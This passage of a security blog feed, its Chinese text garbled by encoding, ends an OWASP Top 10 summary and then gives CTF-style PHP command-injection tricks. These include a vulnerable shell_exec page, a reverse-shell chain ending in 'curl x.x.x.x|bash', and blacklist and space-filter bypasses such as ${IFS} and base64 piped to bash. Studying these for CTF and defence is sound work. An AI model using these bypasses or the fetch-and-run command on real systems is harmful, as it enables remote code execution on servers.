punctuation">,</span><span class="token variable">$fullName</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ListUsers.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Select * From users Where loggedIn=true'</span><span class="token punctuation">;</span><span class="token variable">$results</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Print list of users to page</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div id="userlist">Currently Active Users:'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$results</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="userNames">'</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fullname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šçš„webåº”ç”¨ç¨‹åºç”±ä¸¤ä¸ªç‹¬ç«‹çš„é¡µé¢ç»„æˆï¼Œä¸€ä¸ªé¡µé¢ç”¨äºåˆ›å»ºç”¨æˆ·çš„è´¦æˆ·ï¼Œå¦å¤–ä¸€ä¸ªé¡µé¢ç”¨äºåˆ—å‡ºå½“å‰ç™»å½•çš„æ´»åŠ¨ç”¨æˆ·</p><p>æ”»å‡»è€…å¯ä»¥å°†å…¶åç§°è®¾ç½®ä¸ºä»»æ„HTMLï¼Œç„¶åå°†å…¶æ˜¾ç¤ºç»™â€œæ´»åŠ¨ç”¨æˆ·â€é¡µé¢çš„æ‰€æœ‰è®¿é—®è€…ã€‚è¯¥HTMLä¾‹å¦‚å¯ä»¥æ˜¯çªƒå–ç™»å½•æ¶ˆæ¯çš„å¯†ç ã€‚</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (â€˜Cross-site Scriptingâ€™)</a></p><h4 id="Prevent-6"><a href="#Prevent-6" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ä½¿ç”¨è®¾è®¡ä¸Šè‡ªåŠ¨è½¬ä¹‰XSSçš„æ¡†æ¶ï¼Œä¾‹å¦‚æœ€æ–°çš„Ruby on Rails, React JSï¼Œäº†è§£æ¯ä¸ªæ¡†æ¶çš„XSSä¿æŠ¤çš„å±€é™æ€§ï¼Œå¹¶é€‚å½“å¤„ç†æœªæ¶µç›–çš„ç”¨ä¾‹</li><li>æ ¹æ®HTMLè¾“å‡ºä¸­çš„ä¸Šä¸‹æ–‡ï¼ˆæ­£æ–‡ï¼Œå±æ€§ï¼ŒJavaScriptï¼ŒCSSï¼Œæˆ–URLï¼‰è½¬ä¹‰ä¸å—ä¿¡ä»»çš„HTTPè¯·æ±‚æ•°æ®å°†è§£å†³XSSæ¼æ´</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">A7:2017-Cross-Site Scripting (XSS)</a></p><h3 id="ä¸å®‰å…¨çš„ååºåˆ—åŒ–"><a href="#ä¸å®‰å…¨çš„ååºåˆ—åŒ–" class="headerlink" title="ä¸å®‰å…¨çš„ååºåˆ—åŒ–"></a>ä¸å®‰å…¨çš„ååºåˆ—åŒ–</h3><h4 id="ç®€ä»‹-7"><a href="#ç®€ä»‹-7" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯ä»¥å¯¼è‡´<a href="https://baike.baidu.com/item/è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/2491231?fr=aladdin">è¿œç¨‹ä»£ç æ‰§è¡Œ</a>ã€<a href="https://baike.baidu.com/item/é‡æ”¾æ”»å‡»?fromtitle=é‡æ’­æ”»å‡»&fromid=19455997">é‡æ”¾æ”»å‡»</a>ã€æ³¨å…¥æ”»å‡»æˆ–ç‰¹æƒå‡çº§æ”»å‡»</p><h4 id="Example-7"><a href="#Example-7" class="headerlink" title="Example"></a>Example</h4><p>å‚è€ƒæœ¬ç«™ï¼š</p><ul><li><a href="https://www.extrader.top/posts/bb56c28a/">pharååºåˆ—åŒ–æµ…æ</a></li><li><a href="https://www.extrader.top/posts/488d0f65/">pythonååºåˆ—åŒ–æ¼æ´æµ…æ</a></li><li><a href="https://www.extrader.top/posts/d3333ead/">ctf-ååºåˆ—åŒ–</a></li></ul><h4 id="Prevent-7"><a href="#Prevent-7" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>åœ¨æ‰€æœ‰åºåˆ—åŒ–å¯¹è±¡ä¸Šå®æ–½å®Œæ•´æ€§æ£€æŸ¥ï¼Œä¾‹å¦‚æ•°å­—ç­¾åï¼Œä»¥é˜²æ­¢æ¶æ„åˆ›å»ºå¯¹è±¡æˆ–ç¯¡æ”¹æ•°æ®ã€‚</li><li>åœ¨å¯¹è±¡åˆ›å»ºä¹‹å‰çš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¼ºåˆ¶æ‰§è¡Œä¸¥æ ¼çš„ç±»å‹çº¦æŸï¼Œå› ä¸ºä»£ç é€šå¸¸å¸Œæœ›ä½¿ç”¨ä¸€ç»„å¯å®šä¹‰çš„ç±»ã€‚</li><li>éš”ç¦»å¹¶è¿è¡Œå¯èƒ½åœ¨ä½ç‰¹æƒç¯å¢ƒä¸­ååºåˆ—åŒ–çš„ä»£ç ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">A8:2017-Insecure Deserialization</a></p><h3 id="ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶"><a href="#ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶" class="headerlink" title="ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶"></a>ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶</h3><h4 id="ç®€ä»‹-8"><a href="#ç®€ä»‹-8" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p><a href="https://baike.baidu.com/item/ç»„ä»¶/6902128?fr=aladdin">ç»„ä»¶</a>(egï¼šåº“ã€æ¡†æ¶æˆ–å…¶ä»–è½¯ä»¶æ¨¡å—)æ‹¥æœ‰åº”ç”¨ç¨‹åºç›¸åŒçš„æƒé™ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¸­å«æœ‰å·²çŸ¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´è·å–æ•°æ®æˆ–æ¥ç®¡æœåŠ¡å™¨ã€‚åŒæ—¶ï¼Œä½¿ç”¨è¿™äº›ç»„ä»¶ä¼šç ´ååº”ç”¨ç¨‹åºé˜²å¾¡ï¼Œé€ æˆå„ç§æ”»å‡»äº§ç”Ÿä¸¥é‡çš„åæœã€‚</p><h4 id="Example-8"><a href="#Example-8" class="headerlink" title="Example"></a>Example</h4><p>å‚è€ƒæœ¬ç«™ï¼š</p><ul><li><a href="https://www.extrader.top/posts/67caa546/">CTF-CVE</a></li></ul><p>æ¼æ´æŸ¥æ‰¾ï¼š</p><p><a href="https://www.cvedetails.com/version-search.php">MITERå¸¸è§æ¼æ´å’ŒæŠ«éœ²ï¼ˆCVEï¼‰æœç´¢</a></p><p><a href="https://nvd.nist.gov/">NVDæ¼æ´æ•°æ®åº“</a></p><h4 id="Prevent-8"><a href="#Prevent-8" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ä½¿ç”¨è¯¸å¦‚<a href="https://www.mojohaus.org/versions-maven-plugin/">version</a>ï¼Œ<a href="https://owasp.org/www-project-dependency-check">DependencyCheck</a>ï¼Œ<a href="https://github.com/retirejs/retire.js/">retire.js</a>ç­‰å·¥å…·ï¼Œè¿ç»­æ¸…ç‚¹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç»„ä»¶ï¼ˆä¾‹å¦‚ï¼Œæ¡†æ¶ï¼Œåº“ï¼‰çš„<a href="https://www.mojohaus.org/versions-maven-plugin/">ç‰ˆæœ¬</a>åŠå…¶ä¾èµ–<a href="https://github.com/retirejs/retire.js/">é¡¹</a>ã€‚æŒç»­ç›‘è§†<a href="https://cve.mitre.org/">CVE</a>å’Œ<a href="https://nvd.nist.gov/">NVD</a>ç­‰æ¥æºçš„ç»„ä»¶ä¸­çš„æ¼æ´ã€‚ä½¿ç”¨è½¯ä»¶ç»„æˆåˆ†æå·¥å…·æ¥è‡ªåŠ¨åŒ–è¯¥è¿‡ç¨‹ã€‚è®¢é˜…ç”µå­é‚®ä»¶è­¦æŠ¥ä»¥è·å–ä¸æ‚¨ä½¿ç”¨çš„ç»„ä»¶ç›¸å…³çš„å®‰å…¨æ¼æ´ã€‚</li><li>ä»…é€šè¿‡å®‰å…¨é“¾æ¥ä»å®˜æ–¹æ¥æºè·å–ç»„ä»¶ã€‚ä¼˜å…ˆé€‰æ‹©ç»è¿‡ç­¾åçš„è½¯ä»¶åŒ…ï¼Œä»¥å‡å°‘åŒ…å«ç»è¿‡ä¿®æ”¹çš„æ¶æ„ç»„ä»¶çš„æœºä¼šã€‚</li><li>ç›‘è§†æœªç»´æŠ¤çš„åº“å’Œç»„ä»¶æˆ–æœªä¸ºæ—§ç‰ˆæœ¬åˆ›å»ºå®‰å…¨è¡¥ä¸çš„ç»„ä»¶ã€‚å¦‚æœæ— æ³•ä¿®è¡¥ï¼Œè¯·è€ƒè™‘éƒ¨ç½²<a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">è™šæ‹Ÿä¿®è¡¥ç¨‹åº</a>ä»¥ç›‘è§†ï¼Œæ£€æµ‹æˆ–é˜²æ­¢å‘ç°çš„é—®é¢˜ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017-Using Components with Known Vulnerabilities</a></p><h3 id="ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§"><a href="#ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§" class="headerlink" title="ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§"></a>ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§</h3><h4 id="ç®€ä»‹-9"><a href="#ç®€ä»‹-9" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ï¼Œä»¥åŠäº‹ä»¶å“åº”ç¼ºå¤±æˆ–æ— æ•ˆçš„é›†æˆï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿè¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿã€ä¿æŒæŒç»­æ€§çš„æˆ–æ”»å‡»æ›´å¤šçš„ç³»ç»Ÿï¼Œä»¥åŠå¯¹æ•°æ®çš„ä¸å½“æ“ä½œã€‚</p><h4 id="Example-9"><a href="#Example-9" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">incrementLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">recentLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed login attempt by User: "</span> <span class="token operator">.</span> <span class="token variable">$userName</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" at "</span> <span class="token operator">+</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä»¥ä¸Šä»£ç è®°å½•å¯ç–‘çš„å¤šæ¬¡ç™»å½•å°è¯•ã€‚</p><p>æ­¤ä»£ç ä»…åœ¨è¾¾åˆ°ç‰¹å®šé™åˆ¶æ—¶è®°å½•å¤±è´¥çš„ç™»å½•å°è¯•ã€‚å¦‚æœæ”»å‡»è€…çŸ¥é“æ­¤é™åˆ¶ï¼Œåˆ™å¯ä»¥é€šè¿‡é¿å…è¯¥é™åˆ¶æ¥é˜»æ­¢å‘ç°æ”»å‡»ã€‚</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></p><h4 id="Prevent-9"><a href="#Prevent-9" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ç¡®ä¿å¯ä»¥ä½¿ç”¨è¶³å¤Ÿçš„ç”¨æˆ·ä¸Šä¸‹æ–‡è®°å½•æ‰€æœ‰ç™»å½•ï¼Œè®¿é—®æ§åˆ¶å¤±è´¥å’ŒæœåŠ¡å™¨ç«¯è¾“å…¥éªŒè¯å¤±è´¥çš„äº‹ä»¶ï¼Œä»¥è¯†åˆ«å¯ç–‘æˆ–æ¶æ„å¸æˆ·ï¼Œå¹¶ä¿ç•™è¶³å¤Ÿçš„æ—¶é—´ä»¥è¿›è¡Œå¤„ç†ã€‚</li><li>ç¡®ä¿ä»¥ä¸€ç§é›†ä¸­å¼æ—¥å¿—ç®¡ç†è§£å†³æ–¹æ¡ˆå¯ä»¥è½»æ¾ä½¿ç”¨çš„æ ¼å¼ç”Ÿæˆæ—¥å¿—ã€‚</li><li>ç¡®ä¿é«˜ä»·å€¼äº¤æ˜“å…·æœ‰å®Œæ•´æ€§æ§åˆ¶çš„å®¡è®¡è·Ÿè¸ªï¼Œä»¥é˜²æ­¢ç¯¡æ”¹æˆ–åˆ é™¤ï¼Œä¾‹å¦‚ä»…è¿½åŠ æ•°æ®åº“è¡¨æˆ–ç±»ä¼¼å†…å®¹ã€‚</li><li>å»ºç«‹æœ‰æ•ˆçš„ç›‘è§†å’Œè­¦æŠ¥ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å¹¶åº”å¯¹å¯ç–‘æ´»åŠ¨ã€‚</li><li>å»ºç«‹æˆ–é‡‡ç”¨äº‹ä»¶å“åº”å’Œæ¢å¤è®¡åˆ’ï¼Œä¾‹å¦‚<a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a>æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">A10:2017-Insufficient Logging &amp; Monitoring</a></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://owasp.org/www-project-top-ten/2017/Top_10">OWASP Top 10 Application Security Risks - 2017</a></li><li><a href="https://blog.csdn.net/wang_624/article/details/89683571">OWASP Top 10 ç®€å•ä»‹ç»</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://owasp.org/&quot;&gt;Owasp&lt;/a&gt; å…¨ç§° Open Web Application Security Projectï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœ€å…·æƒå¨çš„å°±æ˜¯å…¶â€åå¤§å®‰å…¨æ¼æ´åˆ—è¡¨â€ï¼Œç›®å‰æ­£å¼å‘å¸ƒçš„æœ€æ–°ç‰ˆæœ¬æ˜¯2017å¹´11æœˆä»½å‘å¸ƒçš„ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹å¯¹2017å¹´çš„Top 10ç‰ˆæœ¬åšä¸€ä¸ªå½’çº³ï¼Œä¾‹å­ä¸­ä¸å…¨çš„æ¬¢è¿å„ä½å¤§ä½¬è¯„è®ºæŒ‡å‡ºï¼Œåç»­æœ‰ä¼šæ·»åŠ ä¸Šã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="Owasp" scheme="https://www.extrader.top/tags/Owasp/"/>
    
  </entry>
  
  <entry>
    <title>phpå‘½ä»¤æ‰§è¡Œå°æŠ€å·§</title>
    <link href="https://www.extrader.top/posts/45c7e77/"/>
    <id>https://www.extrader.top/posts/45c7e77/</id>
    <published>2020-08-14T02:55:31.000Z</published>
    <updated>2020-09-06T16:08:26.802Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-GxNoCndt" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="115162" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><span id="more"></span><h2 id="çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶"><a href="#çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶" class="headerlink" title="çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶"></a><strong>çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶</strong></h2><p>é™åˆ¶æ¡ä»¶ï¼šé•¿åº¦<strong>&lt;=4</strong></p><p>é™åˆ¶ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hack!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a><strong>å‘½ä»¤æ‰§è¡Œ</strong></h3><p>å…ˆçœ‹æ•ˆæœå›¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814204553709.png" alt loading="lazy"></p><p><strong>åŸç†</strong></p><ol><li><code>&gt;</code>åé¢è·Ÿçš„æ–‡ä»¶åï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ªä»¥è¿™ä¸ªå­—ç¬¦ä¸²å‘½åçš„æ–‡ä»¶</li><li><code>*</code>å¯ä»¥å°†æ–‡ä»¶åï¼ˆæŒ‰é¦–å­—æ¯æ’åºï¼‰åˆ—å‡ºæ¥å½“ä¸€è¡Œå‘½ä»¤æ‰§è¡Œ</li><li><code>*v</code>åŒ¹é…å½“å‰ç›®å½•ä¸‹ä»¥<code>v</code>ç»“å°¾çš„çš„æ–‡ä»¶åï¼Œ<code>*v</code>=<code>rev v</code>ï¼Œè¾“å‡º<code>v</code>æ–‡ä»¶å†…å®¹é‡Œé¢å†…å®¹çš„ååºç»“æœï¼Œ<code>&gt;cat|*t</code>åŒç†</li><li><code>dir a b&gt;c</code>åªä¼šå°†<code>a b</code>å†™åˆ°æ–‡ä»¶<code>c</code>ä¸­</li></ol><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a><strong>åå¼¹shell</strong></h3><p>å…ˆçœ‹æ•ˆæœå›¾ï¼š</p><p>è·å–<code>ls -th &gt;g</code>å‘½ä»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814220444746.png" alt loading="lazy"></p><p>è·å–<code>curl x.x.x.x|bash</code>å‘½ä»¤</p><p><code>&gt;cu\\</code>è¿™é‡Œçœ‹ç€æ˜¯5ä¸ªå­—ç¬¦ï¼Œè¶…è¿‡äº†4ä¸ªçš„é™åˆ¶ï¼Œå®é™…ä¸Šæ˜¯å› ä¸º shellç¯å¢ƒéœ€è¦è¾“å…¥<code>\\</code>äº§ç”Ÿ<code>\</code>ï¼Œä½†æ˜¯<code>php</code> ä»£ç <code>exec</code>æ—¶ï¼Œåªéœ€è¦è¾“å…¥<code>\</code>å³å¯äº§ç”Ÿ<code>\</code>ï¼Œæ¯”å¦‚ <code>exec(&quot;&gt;cu\&quot;)</code>å³å¯ã€‚æ‰€ä»¥è¿™é‡Œå®é™…ä¸Šæ˜¯ä¸è¶…è¿‡4ä¸ªå­—ç¬¦çš„ï¼Œä¸ºäº†æ¼”ç¤ºç›´è§‚ï¼Œåœ¨<code>shell</code>ä¸­ç›´æ¥æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814223956562.png" alt loading="lazy"></p><p>æ‰§è¡Œç»“æœï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814221328388.png" alt loading="lazy"></p><p><strong>åŸç†</strong></p><ol><li><code>ls -t</code>æŒ‰æ—¶é—´é¡ºåºæ’åˆ—æ–‡ä»¶ï¼Œ<code>ls -th</code>ä¸å½±å“å‘½ä»¤æ‰§è¡Œï¼Œä¸ºäº†è®©å€’åºçš„æ—¶å€™<code>ht-</code>åœ¨<code>sl</code>å‰é¢</li><li><code>\</code>  <code>linux</code>ä¸‹è¡Œæœ«åŠ ä¸Š<code>\</code>ä¼šå°†è¯¥è¡Œæœ«å°¾ä¸ä¸‹ä¸€è¡Œè¡Œé¦–è¿æ¥èµ·æ¥ï¼Œç®€å•æ¥è¯´åº”è¯¥æ˜¯åˆ æ‰äº†æ¢è¡Œç¬¦</li></ol><p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæ–‡ä»¶åä¸­ä¸èƒ½åŒ…å«<code>/</code>è¿™ä¸ªç¬¦å·çš„ï¼Œæ‰€ä»¥éœ€è¦å°†åå¼¹shellçš„æœåŠ¡å™¨æ ¹ç›®å½•ä¸‹é»˜è®¤ç½‘é¡µè®¾ç½®æˆcurlä¸‹åå¼¹shellçš„å‘½ä»¤çš„ç½‘é¡µ</p><p>ä¾‹å¦‚æˆ‘ubuntuæœåŠ¡å™¨çš„Apacheé»˜è®¤ç½‘é¡µè®¾ç½®åœ¨<code>/etc/apache2/mods-available/dir.conf</code>ä¸­ï¼Œç¼–è¾‘å¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814225408259.png" alt loading="lazy"></p><p>1.txtä¸­ä¸ºåå¼¹shellçš„å‘½ä»¤ï¼Œè¿™æ ·å³å¯æˆåŠŸæ‰§è¡Œ</p><p>æˆ–è€…ä½ æ”¹index.htmlçš„å†…å®¹ä¹Ÿè¡Œ</p><h2 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a><strong>ç»•è¿‡ç©ºæ ¼</strong></h2><ul><li>${PS2} å¯¹åº”å­—ç¬¦ â€˜&gt;â€™</li><li>${PS4} å¯¹åº”å­—ç¬¦ â€˜+â€™</li><li>${IFS} å¯¹åº” å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦</li><li>${9} å¯¹åº” ç©ºå­—ç¬¦ä¸²</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token variable">$9</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>phpä¸‹å¯ä»¥cat%09/flag<span class="token operator">&lt;></span>linux@Extrader:/var/www/html$ cat<span class="token operator">&lt;</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a><strong>é»‘åå•ç»•è¿‡</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">æ‹¼æ¥linux@Extrader:/var/www/html$ <span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>/flag<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$c</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>base64ç¼–ç linux@Extrader:/var/www/html$ <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token variable">`</span></span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>å•å¼•å·ã€åŒå¼•å·linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">""</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">''</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>åæ–œçº¿ <span class="token punctuation">\</span>linux@Extrader:/var/www/html$ ca<span class="token punctuation">\</span>t /fl<span class="token punctuation">\</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a><strong>æ–‡ä»¶è¯»å–</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flag   <span class="token comment"># è¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ 